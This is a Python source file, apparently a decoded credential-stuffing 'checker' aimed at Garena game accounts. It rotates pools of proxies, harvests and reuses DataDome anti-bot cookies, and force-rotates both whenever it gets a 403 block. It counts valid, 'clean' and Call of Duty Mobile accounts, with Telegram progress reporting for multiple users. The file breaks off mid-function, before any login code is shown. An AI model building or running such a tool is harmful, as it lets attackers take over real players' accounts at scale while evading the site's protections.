#Decode By Crazy | @PokiePy
import os
import sys
import time
import random
import hashlib
import uuid
import base64
import gc
from datetime import datetime, timezone
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from Crypto.Cipher import AES
from numpy import rint
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich import box

colorama.init(autoreset=True)

console = Console()

class _SilentConsole:
    """Drop-in replacement for Rich Console — swallows all output in BOT_MODE."""
    def print(self, *a, **kw):
        if not BOT_MODE:
            bot_console.print(*a, **kw)
    def input(self, *a, **kw):
        return console.input(*a, **kw)

bot_console = _SilentConsole()

# ── Banner color shortcuts (used in print_banner) ──────────────
W   = '\033[0m'           # Reset
GR  = '\033[90m'          # Gray
R   = '\033[1;31m'        # Bold Red
RED = '\033[101m'         # BG Bright Red
B   = '\033[0;34m\033[1m' # Bold Blue
CY  = Fore.CYAN

# Global shutdown event for Ctrl+C handling
shutdown_event = Event()

# ── Thread exception hook — prevents silent thread crashes ──────
def _thread_exception_hook(args):
    logger = logging.getLogger(__name__)
    logger.error(f"[THREAD] ❌ Uncaught exception in thread {args.thread.name}: {args.exc_type.__name__}: {args.exc_value}")
threading.excepthook = _thread_exception_hook

# When True: suppress all per-account terminal prints so progress bars stay clean
BOT_MODE = False

# Per-user stop events — set to stop a running checker
_stop_events: dict = {}   # chat_id -> threading.Event()
_stop_events_lock = threading.Lock()

# Per-owner proxy accumulator — collects lines across multiple messages
_proxy_accumulator: dict = {}   # chat_id -> [raw_line, ...]

# Per-owner proxy message tracker — message IDs to delete on Done
_proxy_msg_ids: dict = {}       # chat_id -> [msg_id, ...]

# Per-owner deletekey selection — tracks which keys are selected for deletion
_deletekey_selection: dict = {}  # chat_id -> set of key strings

# ══════════════════════════════════════════════════════════════
#  GLOBAL RESOURCE CONTROLS
#  Tuned for: 8GB RAM VPS, 83% RAM at idle (~1.35GB free)
#
#  RAM math per checker thread:
#    • cloudscraper session  ~12MB
#    • requests + TLS stack   ~8MB
#    • Python overhead        ~5MB
#    • ≈ 25MB per thread (safe estimate)
#
#  Free RAM:  ~1350MB
#  Reserve for OS + bot overhead: 400MB
#  Usable for threads: ~950MB
#  Max safe threads: 950 / 25 ≈ 38 → cap at 4 (conservative, stable)
#
#  CPU is only 21.8% so CPU is NOT the bottleneck — RAM is.
# ══════════════════════════════════════════════════════════════

# Hard cap on total checker threads across ALL users at once
MAX_GLOBAL_THREADS   = 20     # increased for Railway — handles more concurrent work
# Threads per individual user (limits one user hogging everything)
MAX_THREADS_PER_USER = 5      # 5 threads per user — fast & stable
# Max users running the checker simultaneously
MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
# VIP users get higher thread count for faster checking
VIP_THREADS_PER_USER = 5      # VIP users: 5 threads (same cap, priority scheduling)

# Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
_global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)

# ══════════════════════════════════════════════════════════════
#  GEO PROXY CONFIG  (auto-reads all .txt files from proxy/ folder, loops)
# ══════════════════════════════════════════════════════════════
PROXY_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy")

def _init_proxy_folder():
    """Create proxy/ folder + a sample proxies.txt if folder didn't exist."""
    if not os.path.exists(PROXY_FOLDER):
        os.makedirs(PROXY_FOLDER, exist_ok=True)
        sample = os.path.join(PROXY_FOLDER, "proxies.txt")
        with open(sample, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here (one per line)\n")
            f.write("# Supported formats:\n")
            f.write("#   ip:port\n")
            f.write("#   user:pass@ip:port\n")
            f.write("#   http://ip:port\n")
            f.write("#   http://user:pass@ip:port\n")
            f.write("#   ip:port:user:pass\n")
        print(f"\033[92m📁 proxy/ folder created — add your proxy .txt files inside it\033[0m")

_init_proxy_folder()

def _get_proxy_files():
    """
    Scan the proxy/ folder and return a sorted list of all non-empty .txt files.
    Re-scans the folder every call so newly added files are picked up at runtime.
    Files that exist but contain zero valid (non-comment) lines are skipped.
    """
    if not os.path.exists(PROXY_FOLDER):
        return []
    result = []
    for fname in sorted(os.listdir(PROXY_FOLDER), key=str.lower):
        if not fname.endswith(".txt"):
            continue
        fpath = os.path.join(PROXY_FOLDER, fname)
        if not os.path.isfile(fpath):
            continue
        # Only include files that have at least one non-blank, non-comment line
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as fh:
                has_content = any(
                    l.strip() and not l.strip().startswith("#")
                    for l in fh
                )
        except OSError:
            has_content = False
        if has_content:
            result.append(fpath)
    return result

PROXY_FILES = _get_proxy_files()

def backoff(attempt: int, base: float = 0.03, cap: float = 0.2) -> None:
    """Ultra-fast exponential backoff: 0.03s → 0.06s → 0.12s → 0.2s (capped)."""
    delay = min(base * (2 ** attempt), cap)
    time.sleep(delay)

class GeoRotator:
    """
    Auto-loads ALL .txt proxy files from the proxy/ folder at startup (sorted).
    - Merges all proxies from all files into one pool, deduplicates them.
    - Re-scans the folder dynamically so newly added .txt files are picked up.
    - Each thread gets its OWN proxy index to avoid conflicts.
    - Dead/blocked proxies are removed from memory AND their source file on disk.
    """

    def __init__(self):
        self._lock = Lock()
        self._file_idx = 0
        self._proxies = []
        self._proxy_source = {}     # proxy_url -> source filepath (for disk removal)
        self._thread_idx = {}
        self._thread_proxy = {}     # thread_ident -> last proxy URL handed to that thread
        self._global_idx = 0
        # Always re-scan folder on init so new files are picked up
        global PROXY_FILES
        PROXY_FILES = _get_proxy_files()
        self._load_all_files()
        self._current_proxy = self._proxies[0] if self._proxies else None

    def _normalize_proxy(self, line):
        """
        Normalize a proxy line into a valid URL string.

        Supported input formats:
          1. http://host:port
          2. https://host:port
          3. http://user:pass@host:port
          4. https://user:pass@host:port
          5. host:port                          → http://host:port
          6. user:pass@host:port                → http://user:pass@host:port
          7. ip:port:username:password          → http://username:password@ip:port
          8. ip:port:username:password (https)  → detected if scheme prefix present

        Returns a normalized URL string, or None if the line is invalid.
        """
        original = line

        # ── Step 1: Detect and strip explicit scheme ──────────────────────────
        scheme = "http"
        if line.lower().startswith("https://"):
            scheme = "https"
            line = line[8:]
        elif line.lower().startswith("http://"):
            scheme = "http"
            line = line[7:]

        # ── Step 2: Detect user:pass@host:port (already has @) ───────────────
        if "@" in line:
            # Format: user:pass@host:port  — rebuild cleanly
            creds, _, hostport = line.partition("@")
            parts = hostport.rsplit(":", 1)
            if len(parts) == 2 and parts[1].isdigit():
                return f"{scheme}://{creds}@{hostport}"
            logging.getLogger(__name__).warning(
                f"[GEO] ⚠️  Skipping malformed proxy (bad host:port after @): {original}"
            )
            return None

        # ── Step 3: Split by ':' to detect format ────────────────────────────
        parts = line.split(":")

        if len(parts) == 2:
            # Format: host:port
            host, port_str = parts
            if host and port_str.isdigit():
                return f"{scheme}://{host}:{port_str}"

        elif len(parts) == 4:
            # Format: ip:port:username:password
            ip, port_str, username, password = parts
            if ip and port_str.isdigit():
                return f"{scheme}://{username}:{password}@{ip}:{port_str}"

        elif len(parts) == 3:
            # Ambiguous — could be host:port:junk or user:pass:host (uncommon)
            # Try host:port (ignore third segment with a warning)
            host, port_str, extra = parts
            if host and port_str.isdigit():
                logging.getLogger(__name__).warning(
                    f"[GEO] ⚠️  Proxy has 3 colon-parts, treating as host:port (ignoring '{extra}'): {original}"
                )
                return f"{scheme}://{host}:{port_str}"

        logging.getLogger(__name__).warning(
            f"[GEO] ⚠️  Skipping unrecognized proxy format: {original}"
        )
        return None

    def _load_proxies_from_file(self, filepath):
        """Read a proxy file and return list of (normalized_url, filepath) tuples."""
        if not os.path.exists(filepath):
            return []
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        except OSError:
            return []
        result = []
        for line in lines:
            normalized = self._normalize_proxy(line)
            if normalized:
                result.append((normalized, filepath))
        return result

    def _load_all_files(self):
        """
        Re-scan proxy/ folder, load ALL .txt files, merge into one deduplicated pool.
        Called at startup and whenever the pool runs dry.
        Prints a summary table of files and proxy counts.
        """
        global PROXY_FILES
        PROXY_FILES = _get_proxy_files()
        log = logging.getLogger(__name__)

        if not PROXY_FILES:
            log.warning("[GEO] ⚠️  No proxy .txt files found in proxy/ folder — running without proxy!")
            self._proxies = []
            self._proxy_source = {}
            return False

        seen = set()
        merged = []
        source_map = {}
        file_counts = {}

        for filepath in PROXY_FILES:
            pairs = self._load_proxies_from_file(filepath)
            fname = os.path.basename(filepath)
            loaded = 0
            dupes = 0
            for url, src in pairs:
                if url in seen:
                    dupes += 1
                    continue
                seen.add(url)
                merged.append(url)
                source_map[url] = src
                loaded += 1
            file_counts[fname] = (loaded, dupes)
            if loaded:
                log.info(f"[GEO] 📄 {fname}: {loaded} proxies loaded" +
                         (f" ({dupes} dupes skipped)" if dupes else ""))
            else:
                log.warning(f"[GEO] ⚠️  {fname}: empty or all invalid — skipped")

        if not merged:
            log.warning("[GEO] ⚠️  All proxy files empty or invalid — running without proxy!")
            self._proxies = []
            self._proxy_source = {}
            return False

        random.shuffle(merged)
        self._proxies = merged
        self._proxy_source = source_map
        self._thread_idx = {}

        log.info(f"[GEO] ✅ Proxy pool ready: {len(merged)} unique proxies across {len(PROXY_FILES)} file(s)")
        return True

    def _load_next_file(self):
        """Alias kept for compatibility — delegates to _load_all_files."""
        return self._load_all_files()

    def _load_proxies(self):
        """Alias kept for compatibility."""
        return self._proxies

    def _get_thread_idx(self):
        """Get or assign a proxy index for the current thread."""
        tid = threading.get_ident()
        with self._lock:
            if tid not in self._thread_idx:
                # Assign each new thread a different starting proxy (round-robin)
                self._thread_idx[tid] = self._global_idx % len(self._proxies) if self._proxies else 0
                self._global_idx += 1
            return self._thread_idx[tid]

    def _advance_thread(self):
        """Advance THIS thread's proxy index forward within the unified pool."""
        tid = threading.get_ident()
        with self._lock:
            if not self._proxies:
                return None
            current = self._thread_idx.get(tid, 0)
            new_idx = (current + 1) % len(self._proxies)
            self._thread_idx[tid] = new_idx
            return self._proxies[new_idx]

    def get_proxies(self):
        """Return requests-compatible proxy dict for THIS thread's current proxy.
        Also records which proxy this thread is actively using for accurate removal."""
        if not self._proxies:
            return {}
        idx = self._get_thread_idx()
        proxy_url = self._proxies[idx]
        tid = threading.get_ident()
        with self._lock:
            self._thread_proxy[tid] = proxy_url
        return {"http": proxy_url, "https": proxy_url}

    def remove_blocked_proxy(self, proxy_url):
        """Remove a dead/blocked proxy from memory AND from its source file on disk.
        Lock is held only for the in-memory mutation; file I/O runs outside the lock."""
        if not proxy_url:
            return
        log = logging.getLogger(__name__)
        source_file = None
        pool_empty = False

        with self._lock:
            if proxy_url not in self._proxies:
                return
            # ── Remove from memory ────────────────────────────────────────────
            blocked_idx = self._proxies.index(proxy_url)
            self._proxies.remove(proxy_url)
            source_file = self._proxy_source.pop(proxy_url, None)
            self._thread_proxy.pop(proxy_url, None)  # clean up thread tracking
            log.warning(
                f"[GEO] 🗑️  Removed dead proxy from pool: {proxy_url} "
                f"({len(self._proxies)} remaining)"
            )
            # Fix all thread indices that pointed at or past the removed entry
            for tid in list(self._thread_idx.keys()):
                if self._thread_idx[tid] >= blocked_idx and self._thread_idx[tid] > 0:
                    self._thread_idx[tid] -= 1
            pool_empty = not self._proxies

        # ── Remove from the correct source file on disk (outside lock) ───────
        # _proxy_source gives us the exact file this proxy came from.
        # If missing (e.g. loaded before source tracking), fall back to scanning.
        if not source_file:
            for fpath in _get_proxy_files():
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as fh:
                        for line in fh:
                            stripped = line.strip()
                            if stripped and not stripped.startswith("#"):
                                if self._normalize_proxy(stripped) == proxy_url:
                                    source_file = fpath
                                    break
                except OSError:
                    pass
                if source_file:
                    break

        if source_file and os.path.exists(source_file):
            try:
                with open(source_file, "r", encoding="utf-8", errors="ignore") as fh:
                    lines = fh.readlines()
                new_lines = []
                removed_count = 0
                for line in lines:
                    stripped = line.strip()
                    if not stripped or stripped.startswith("#"):
                        new_lines.append(line)
                        continue
                    if self._normalize_proxy(stripped) == proxy_url:
                        removed_count += 1  # skip this line (delete from file)
                    else:
                        new_lines.append(line)
                with open(source_file, "w", encoding="utf-8") as fh:
                    fh.writelines(new_lines)
                if removed_count:
                    log.warning(
                        f"[GEO] 🗑️  Deleted proxy from {os.path.basename(source_file)} "
                        f"({removed_count} line(s) removed)"
                    )
                else:
                    log.warning(
                        f"[GEO] ⚠️  Proxy not found in {os.path.basename(source_file)} — "
                        f"may have been removed already or format mismatch"
                    )
            except Exception as e:
                log.error(f"[GEO] ❌ Failed to write proxy file {source_file}: {e}")
        else:
            log.warning(f"[GEO] ⚠️  Could not locate source file for proxy: {proxy_url}")


    def force_rotate(self):
        """Rotate THIS thread's proxy — remove the dead one, then return the next.
        Never returns None as long as there are proxies in any file."""
        tid = threading.get_ident()
        log = logging.getLogger(__name__)

        # Grab the proxy this thread actually used (recorded by get_proxies())
        with self._lock:
            blocked_proxy = (
                self._thread_proxy.get(tid)
                or (self._proxies[self._thread_idx.get(tid, 0)] if self._proxies else None)
            )
            self._thread_proxy.pop(tid, None)

        # Remove dead proxy from memory + disk
        if blocked_proxy:
            self.remove_blocked_proxy(blocked_proxy)

        # If pool is now empty after removal, reload from disk before advancing
        if not self._proxies:
            log.warning("[GEO] ⚠️  Pool empty after removal — reloading proxy files...")
            self._load_all_files()

        # Advance this thread to the next proxy in the (possibly reloaded) pool
        proxy_url = self._advance_thread()

        log.info(f"[GEO] ⚡ Thread {tid} rotated → {proxy_url}")
        return proxy_url

    def smart_rotate(self):
        """Fast rotate without removing — just skip to next proxy. Used for soft failures."""
        proxy_url = self._advance_thread()
        return proxy_url

    @property
    def current_proxy(self):
        if not self._proxies:
            return None
        idx = self._get_thread_idx()
        return self._proxies[idx]

    @property
    def total(self):
        return len(self._proxies)

# Singleton — created once, shared everywhere
geo_rotator = GeoRotator()

def signal_handler(signum, frame):
    """Handle SIGINT (Ctrl+C) and SIGTERM (process manager shutdown) gracefully."""
    sig_name = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
    shutdown_event.set()   # signal all polling loops and checkers to stop
    print(f"\n  ⚠️  {sig_name} received — shutting down gracefully...")
    # Give threads up to 3 seconds to finish current work
    time.sleep(1)
    os._exit(0)

# Register both SIGINT (Ctrl+C) and SIGTERM (Wispbyte/systemd kill)
signal.signal(signal.SIGINT,  signal_handler)
signal.signal(signal.SIGTERM, signal_handler) 

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    LIGHTCYAN_EX = colorama.Fore.LIGHTCYAN_EX
    LIGHTYELLOW_EX = colorama.Fore.LIGHTYELLOW_EX
    LIGHTRED_EX = colorama.Fore.LIGHTRED_EX
    LIGHTBLUE_EX = colorama.Fore.LIGHTBLUE_EX
    LIGHTWHITE_EX = colorama.Fore.LIGHTWHITE_EX
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    MAGENTA = colorama.Fore.MAGENTA
    RESET = colorama.Style.RESET_ALL

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)   

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    COOKIE_MAX_LINES = 1000   # auto-delete threshold
    COOKIE_KEEP      = 1      # keep only 1 newest cookie after cleanup (delete 999)

    def __init__(self):
        self.banned_cookies = set()
        self._cookie_lock = threading.Lock()
        self.load_banned_cookies()
        # Auto-trim on startup if file already exceeds limit
        self._auto_trim_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')

    def _auto_trim_cookies(self):
        """Auto-delete 999 oldest cookies when file reaches 1000 lines. Keep only newest."""
        with self._cookie_lock:
            if not os.path.exists('fresh_cookie.txt'):
                return
            try:
                with open('fresh_cookie.txt', 'r') as f:
                    lines = [l.strip() for l in f if l.strip()]
                if len(lines) >= self.COOKIE_MAX_LINES:
                    keep = lines[-self.COOKIE_KEEP:]   # keep only the newest cookie(s)
                    deleted = len(lines) - len(keep)
                    with open('fresh_cookie.txt', 'w') as f:
                        f.write('\n'.join(keep) + '\n')
                    logger.info(f"[COOKIE] 🗑️ Auto-deleted {deleted} old cookies (kept {len(keep)} newest)")
            except Exception as e:
                logger.warning(f"[COOKIE] ⚠️ Error trimming cookies: {e}")
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            with self._cookie_lock:
                existing_cookies = set()
                if os.path.exists('fresh_cookie.txt'):
                    with open('fresh_cookie.txt', 'r') as f:
                        existing_cookies = set(line.strip() for line in f if line.strip())
                        
                if formatted_cookie not in existing_cookies:
                    with open('fresh_cookie.txt', 'a') as f:
                        f.write(formatted_cookie + '\n')
                    # Check if we hit the 1K threshold after adding
                    cookie_count = len(existing_cookies) + 1
                    if cookie_count >= self.COOKIE_MAX_LINES:
                        self._auto_trim_cookies()
                    return True
                return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def handle_403(self, session, telegram_config=None):
        """On EVERY 403 — immediately force-rotate proxy, refresh DataDome, resume."""
        self._403_attempts += 1

        old_proxy = geo_rotator.current_proxy

        logger.warning(f"[403] 🚫 Access denied — force-rotating proxy instantly... (attempt #{self._403_attempts})")

        # ── Try up to 3 proxy rotations for fast recovery ────────────────────
        for rot_attempt in range(3):
            try:
                if rot_attempt == 0:
                    new_proxy = geo_rotator.force_rotate()
                else:
                    new_proxy = geo_rotator.smart_rotate()
                session.proxies.update(geo_rotator.get_proxies())
                logger.info(f"[403] ✅ Thread {threading.get_ident()} rotated → {new_proxy}")

                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    self._403_attempts = 0
                    logger.info(f"[403] 🍪 Fresh DataDome obtained | New proxy: {new_proxy}")
                    return True
            except Exception as e:
                logger.warning(f"[403] ⚠️ Rotation attempt {rot_attempt+1} failed: {e}")

        logger.error(f"[403] ❌ Failed to recover after 3 proxy rotations — skipping account")
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()
        # Progress tracking fields
        self.start_time = None
        self.last_update_time = None
        self.last_processed_count = 0
        self.current_speed = 0.0  # accounts per second
        self.eta_seconds = None
        self.total_accounts = 0
        # Level distribution tracking
        self.level_distribution = {
            "1-50": 0, "51-100": 0, "101-150": 0, "151-200": 0,
            "201-250": 0, "251-300": 0, "301-350": 0, "351+": 0
        }
        # Server/region distribution tracking
        self.server_distribution = {}

    def start_tracking(self, total_accounts):
        """Initialize progress tracking with total account count."""
        with self.lock:
            self.start_time = time.time()
            self.last_update_time = self.start_time
            self.last_processed_count = 0
            self.total_accounts = total_accounts
            self.current_speed = 0.0
            self.eta_seconds = None

    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=0, region=""):
        with self.lock:
            self.total_processed += 1

            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                    # Track level distribution
                    try:
                        lvl = int(codm_level) if codm_level else 0
                    except (ValueError, TypeError):
                        lvl = 0
                    if lvl > 0:
                        if lvl <= 50: self.level_distribution["1-50"] += 1
                        elif lvl <= 100: self.level_distribution["51-100"] += 1
                        elif lvl <= 150: self.level_distribution["101-150"] += 1
                        elif lvl <= 200: self.level_distribution["151-200"] += 1
                        elif lvl <= 250: self.level_distribution["201-250"] += 1
                        elif lvl <= 300: self.level_distribution["251-300"] += 1
                        elif lvl <= 350: self.level_distribution["301-350"] += 1
                        else: self.level_distribution["351+"] += 1
                    # Track server/region distribution
                    if region and region not in ('N/A', '', 'NONE', 'NULL'):
                        r = region.upper().strip()
                        self.server_distribution[r] = self.server_distribution.get(r, 0) + 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1

            # Calculate speed and ETA every 5 accounts
            now = time.time()
            if self.start_time and self.total_processed % 5 == 0:
                elapsed_since_start = now - self.start_time
                if elapsed_since_start > 0:
                    self.current_speed = self.total_processed / elapsed_since_start
                time_since_last = now - self.last_update_time
                if time_since_last > 0:
                    delta = self.total_processed - self.last_processed_count
                    instant_speed = delta / time_since_last
                    # Smooth the speed using weighted average
                    self.current_speed = (0.3 * instant_speed) + (0.7 * self.current_speed)
                if self.current_speed > 0 and self.total_accounts > 0:
                    remaining = self.total_accounts - self.total_processed
                    self.eta_seconds = remaining / self.current_speed
                else:
                    self.eta_seconds = None
                self.last_update_time = now
                self.last_processed_count = self.total_processed

    def should_display(self):
        """Returns True if stats should be displayed (every 20 checks)"""
        with self.lock:
            return self.total_processed % 20 == 0

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed,
                'speed': round(self.current_speed, 2),
                'eta': self.eta_seconds,
                'total_accounts': self.total_accounts,
                'elapsed': time.time() - self.start_time if self.start_time else 0,
                'level_distribution': dict(self.level_distribution),
                'server_distribution': dict(self.server_distribution),
            }

    def get_progress_bar(self, width=30):
        """Generate a visual progress bar string."""
        with self.lock:
            if self.total_accounts <= 0:
                return ""
            pct = self.total_processed / self.total_accounts
            filled = int(width * pct)
            bar = "█" * filled + "░" * (width - filled)
            return f"[{bar}] {pct * 100:.1f}%"

    def format_time(self, seconds):
        """Format seconds into human-readable time string."""
        if seconds is None or seconds < 0:
            return "N/A"
        seconds = int(seconds)
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        secs = seconds % 60
        if hours > 0:
            return f"{hours}h {minutes}m {secs}s"
        elif minutes > 0:
            return f"{minutes}m {secs}s"
        else:
            return f"{secs}s"

    def display_stats(self):
        stats = self.get_stats()

        # Color codes
        cyan = '\033[1;96m'
        white = '\033[1;37m'
        green = '\033[1;92m'
        red = '\033[1;91m'
        blue = '\033[1;94m'
        magenta = '\033[1;95m'
        yellow = '\033[1;93m'
        gray = '\033[90m'
        reset = '\033[0m'

        # Calculate success rate
        success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0

        # Build progress section
        progress_section = ""
        if stats['total_accounts'] > 0:
            pct = stats['total'] / stats['total_accounts']
            filled = int(30 * pct)
            bar = "█" * filled + "░" * (30 - filled)
            speed_str = f"{stats['speed']:.1f}/s" if stats['speed'] > 0 else "calculating..."
            eta_str = self.format_time(stats['eta']) if stats['eta'] else "N/A"
            elapsed_str = self.format_time(stats['elapsed'])
            progress_section = (
                f"{cyan}║{reset}  {yellow}Progress:{reset} [{green}{bar}{reset}] {pct*100:.1f}%   {cyan}║{reset}\n"
                f"{cyan}║{reset}  {white}Speed: {magenta}{speed_str}{reset} {gray}│{reset} {white}ETA: {blue}{eta_str}{reset} {gray}│{reset} {white}Elapsed: {green}{elapsed_str}{reset}  {cyan}║{reset}\n"
                f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            )

        return (
            f"\n{cyan}╔══════════════════════════════════════════════════════════════════╗{reset}\n"
            f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}TyraCutiee - @Yukiii_ii{reset}                       {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{progress_section}"
            f"{cyan}║{reset}  {white}Processed: {magenta}{stats['total']:>4}{reset} {gray}│{reset} "
            f"{white}Success Rate: {green if success_rate >= 50 else red}{success_rate:>5.1f}%{reset}                   {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {green}Valid: {stats['valid']:>4}{reset} {gray}│{reset} "
            f"{red}Invalid: {stats['invalid']:>4}{reset} {gray}│{reset} "
            f"{blue}Clean: {stats['clean']:>4}{reset} {gray}│{reset} "
            f"{yellow}Not Clean: {stats['not_clean']:>4}{reset}  {cyan}║{reset}\n"
            f"{cyan}║{reset}  {magenta}CODM: {stats['has_codm']:>4}{reset} {gray}│{reset} "
            f"{gray}No CODM: {stats['no_codm']:>4}{reset}                                  {cyan}║{reset}\n"
            f"{cyan}╚══════════════════════════════════════════════════════════════════╝{reset}\n"
            f"  {gray}Created by: {white}@Yukiii_ii{reset}\n"
        )

    def _make_bar(self, value, total, width=10):
        """Generate a text progress bar like [███████░░░]"""
        if total <= 0:
            return "░" * width
        filled = int(width * value / total)
        return "█" * filled + "░" * (width - filled)

    def get_telegram_progress(self):
        """Get progress info formatted for Telegram messages — basic version."""
        with self.lock:
            if self.total_accounts <= 0:
                return None
            pct = self.total_processed / self.total_accounts
            speed_str = f"{self.current_speed:.1f}/s" if self.current_speed > 0 else "calculating..."
            eta_str = self.format_time(self.eta_seconds) if self.eta_seconds else "N/A"
            elapsed_str = self.format_time(time.time() - self.start_time) if self.start_time else "0s"
            success_rate = (self.valid_count / self.total_processed * 100) if self.total_processed > 0 else 0
            remaining = self.total_accounts - self.total_processed
            return (
                f"📊 *Progress:* {pct*100:.1f}% ({self.total_processed}/{self.total_accounts})\n"
                f"⏱ *Speed:* {speed_str} | *ETA:* {eta_str}\n"
                f"🕐 *Elapsed:* {elapsed_str}\n"
                f"✅ *Valid:* {self.valid_count} | ❌ *Invalid:* {self.invalid_count}\n"
                f"📈 *Success Rate:* {success_rate:.1f}% | *Remaining:* {remaining}"
            )

    def get_fancy_telegram_progress(self):
        """Get the fancy checking display for Telegram with bars, stats, level & server distribution."""
        with self.lock:
            if self.total_accounts <= 0:
                return None

            pct = self.total_processed / self.total_accounts
            pct_int = int(pct * 100)
            bar = self._make_bar(self.total_processed, self.total_accounts, 10)

            lines = [
                f"⚡️ Checking…",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"⏳ [{bar}] {pct_int}%  {self.total_processed:,}/{self.total_accounts:,}",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"✅ Valid      : {self.valid_count:,}",
                f"❌ Invalid    : {self.invalid_count:,}",
                f"✨ Clean      : {self.clean_count:,}",
                f"⚠️  Not Clean  : {self.not_clean_count:,}",
                f"🎮 Has CODM   : {self.has_codm_count:,}",
                f"📭 No CODM    : {self.no_codm_count:,}",
                f"━━━━━━━━━━━━━━━━━━━━",
            ]

            # Level Distribution (only if we have CODM data)
            total_with_level = sum(self.level_distribution.values())
